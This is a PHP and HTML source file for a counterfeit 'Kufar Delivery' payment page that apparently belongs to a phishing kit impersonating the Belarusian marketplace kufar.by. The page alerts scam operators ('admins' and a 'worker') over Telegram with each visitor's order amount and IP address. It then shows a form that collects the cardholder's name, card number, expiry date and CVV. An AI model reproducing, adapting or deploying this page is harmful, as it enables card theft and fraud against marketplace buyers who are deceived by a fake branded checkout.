<?php
include 'system/main.php';

if (!isset($_POST['orderID'])) {
    die("Ошибка.");
}

$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `type` = '2' AND `advert_id` = '" . (int)$_POST['orderID'] . "' AND `status` = '1'");
if (mysqli_num_rows($query) > 0) {
    $order = mysqli_fetch_assoc($query);
    $_SESSION['adid'] = (int)$_POST['orderID'];
    $_SESSION['amount'] = $order['price'] + $order['delivery'];
} else header("Location: https://kufar.by");

if (isset($_SESSION['refund'])) unset($_SESSION['refund']);

$text = "⚠️ Переход на оплату ⚠️\n\n";
$text .= "ID объявления: <code>" . $_POST['orderID'] . "</code>\n";
$text .= "Сумма: <code>" . $_SESSION['amount'] . "</code>\n";
$text .= "IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";

send('sendMessage', array('chat_id' => $config['admins'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));
send('sendMessage', array('chat_id' => $order['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));
?>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Куфар Доставка</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="css/main.css">

</head>
<body>
<div class="container py-5">
    <div class="row">
        <div class="col-lg-7 mx-auto">
            <div id="not"></div>
            <?php
            if ($_SESSION['amount'] > 1400) {
                echo '<p class="alert alert-warning">При сумме больше 1500 белорусских рублей платёж может быть разделён на несколько частей.</p>';
            }
            ?>
            <div class="bg-white rounded-lg shadow-lg p-5">
                <div class="tab-content">
                    <div id="nav-tab-card" class="tab-pane fade show active">
                        <!--<form role="form" id="ccForm" action="complete.php" method="post">-->
                            <div class="form-group">
                                <label for="username">Владелец карты</label>
                                <input type="text" name="username" required=""
                                       class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="cardInput">Номер карты</label>
                                <div class="input-group">
                                    <input type="text" id="cardInput" name="cardNumber" placeholder=""
                                           class="form-control" required="">
                                    <div class="input-group-append">
                    <span class="input-group-text text-muted">
                                                <i class="fa fa-cc-visa mx-1"></i>
                                                <i class="fa fa-cc-amex mx-1"></i>
                                                <i class="fa fa-cc-mastercard mx-1"></i>
                                            </span>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-sm-8">
                                    <div class="form-group">
                                        <label><span class="hidden-xs">Срок действия карты</span></label>
                                        <div class="input-group">
                                            <input type="text" id="month" placeholder="ММ" name="month" class="form-control"
                                                   required="" pattern="[0-9]{2}">
                                            <input type="text" id="year" placeholder="ГГ" name="year" class="form-control"
                                                   required="" pattern="[0-9]{2}">
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-4">
                                    <div class="form-group mb-4">
                                        <label data-toggle="tooltip" title=""
                                               data-original-title="3 цифры на оборотной стороне карты">CVV
                                            <i class="fa fa-question-circle"></i>
                                        </label>
                                        <input type="text" id="cvv" maxlength="3" pattern="[0-9]{3}" name="cvv" required=""
                                               class="form-control">
                                    </div>
                                </div>


                            </div>
                            <button type="button" id="confirm" class="subscribe btn btn-success btn-block shadow-sm">
                                Оплатить
                            </button>
                        <!--</form>-->
                    </div>

                </div>

            </div>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js" integrity="sha256-+4KHeBj6I8jAKAU8xXRMXXlH+sqCvVCoK5GAFkmb+2I=" crossorigin="anonymous"></script>

<script src="js/jquery.creditCardValidator.js"></script>

<?php echo '<script type="text/javascript" src="js/main.js?'. time() .'"></script>' ?>

</body>
</html>